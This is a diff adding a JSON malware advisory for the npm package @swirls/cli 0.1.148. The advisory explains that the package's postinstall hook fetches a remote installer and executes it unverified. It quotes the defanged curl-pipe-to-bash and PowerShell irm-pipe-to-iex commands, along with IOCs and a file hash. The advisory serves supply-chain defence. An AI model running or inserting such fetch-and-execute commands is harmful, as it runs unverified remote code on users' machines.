@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13909",
+  "modified": "2026-11-11T00:21:08Z",
+  "published": "2026-11-11T00:19:56Z",
+  "summary": "Malicious code in @swirls/cli (npm)",
+  "details": "@swirls/cli@0.1.148 ships no CLI implementation: the npm tarball contains only package.json, README.md, a 1.1KB placeholder bin/swirls stub, and scripts/install.js. The package's `postinstall` hook (`node scripts/install.js`) executes on every global install and fetches an unpinned remote installer outside the npm registry, piping it straight into a shell with the installer's full environment inherited: - Linux/macOS: execSync(`curl -fsSL hxxps://swirls[.]ai/install | bash`, { stdio: 'inherit', shell: true })\n- Windows: powershell.exe -NoProfile -Command `irm hxxps://swirls[.]ai/install[.]ps1 | iex`, with SWIRLS_YES=1 set in the child environment The script skips execution when CI=true/1 or when neither npm_config_global nor BUN_INSTALL_GLOBAL is set. Nothing fetched is verified — no hash, signature or version pin is applied — so the code that actually runs at install time is whatever the remote endpoint serves at that moment. After the fetch-and-execute, the hook copies the downloaded binary from ~/.local/bin/swirls over bin/swirls and chmods it 0755, so every later `swirls` invocation runs the remote-downloaded file instead of the published package contents. The placeholder bin/swirls and bin/README.txt both direct the user to re-run the same `curl -fsSL hxxps://swirls[.]ai/install | bash` if the postinstall was skipped. The shipped JavaScript contains no credential, token,.env or.npmrc access; the only environment variables read are CI, npm_config_global, BUN_INSTALL_GLOBAL, HOME and USERPROFILE, used for install-flow control. IOCs: hxxps://swirls[.]ai/install; hxxps://swirls[.]ai/install[.]ps1; dropped/copied file ~/.local/bin/swirls (installed mode 0755, then copied to node_modules/@swirls/cli/bin/swirls).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@swirls/cli",
+        "purl": "pkg:npm/%40swirls/cli"
+      },
+      "versions": [
+        "0.1.148"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@swirls/cli/v/0.1.148"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13909"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-11T00:19:56Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "swirls[.]ai"
+        ],
+        "sha256": [
+          "411ebc1317d6010fa33e6f1d5392c4d16967caca62961847b64cce303e793da9"
+        ],
+        "url_observed": [
+          "hxxps://swirls[.]ai/install",
+          "hxxps://swirls[.]ai/install[.]ps1"
+        ]
+      }
+    }
+  }
+}
